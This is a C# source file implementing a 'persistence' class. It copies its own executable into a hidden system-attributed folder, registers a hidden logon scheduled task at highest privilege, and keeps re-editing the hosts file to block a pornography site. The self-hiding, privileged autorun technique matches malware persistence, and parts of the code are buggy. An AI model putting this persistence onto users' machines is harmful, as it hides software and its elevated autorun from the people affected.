using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Drawing;
using System.Windows.Forms;

namespace ConsoleApp2
{
    class persistence
    {
        public static void InstallSelf()
        {
            try
            {
                if (config.InstallSelf == true)
                {
                    if (!Directory.Exists(Path.GetDirectoryName(config.PersistencePath)))
                    {
                        // Create dir
                        Directory.CreateDirectory(Path.GetDirectoryName(config.PersistencePath));
                    }
                    if (!System.IO.File.Exists(config.PersistencePath))
                    {
                        // Copy
                        System.IO.File.Copy(Application.ExecutablePath, config.PersistencePath);
                        DirectoryInfo dir = new DirectoryInfo(Path.GetDirectoryName(config.PersistencePath));
                        // Set hidden attribute
                        if (config.Hidden)
                        {
                            dir.Attributes |= FileAttributes.Hidden;
                        }
                        // Set system attribute
                        if (config.Hidden)
                        {
                            dir.Attributes |= FileAttributes.System;
                        }
                        CreateLogFile(config.logfile);
                    }
                    if (!File.Exists(config.logfile))
                    {
                        CreateLogFile(config.logfile);
                    }
                }
            }
            catch(Exception e)
            {
                Console.WriteLine($"{e}");
                Console.ReadLine();
            }
        }
        public static void AutoRun()
        {
            if (config.AutoRun == true)
            {
                TaskSchedulerCommand($"/create /f /sc ONLOGON /RL HIGHEST /tn \"{config.AutoRunName}\" /tr \"{config.PersistencePath}\"");
            }
        }
        private static void TaskSchedulerCommand(string args)
        {
            // If autorun disabled
            if (!config.AutoRun == true)
            { return; }
            // Add to autorun
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = "schtasks.exe";
            startInfo.Arguments = args;
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
        }
        /*public static bool Installed()
        {
            if (File.Exists(config.PersistencePath))
            { 
                if (File.Exists(config.logfile))
                {
                    if (config.logfile.Contains("1"))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                else
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }*/
        public static void CheckEditedHosts()
        {
            while (true)
            {
                string HostsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"drivers\etc\hosts");
                if (File.Exists(HostsPath))
                {
                    if (File.ReadAllText(HostsPath).Contains("127.0.0.1 pornhub.com")) return;

                    Program.ModifyHostsFile();
                }
            }
        }
        public static void CreateLogFile(string path)
        {
            try
            {
                if (!File.Exists(path))
                {
                    File.Create(path);
                    using (StreamWriter logfile = new StreamWriter(path))
                    {
                        logfile.WriteLine("1");
                        logfile.Write("1");
                    }
                }
            }
            catch (Exception e) { Console.WriteLine($"{e}"); Console.ReadLine(); }
        }
    }
}
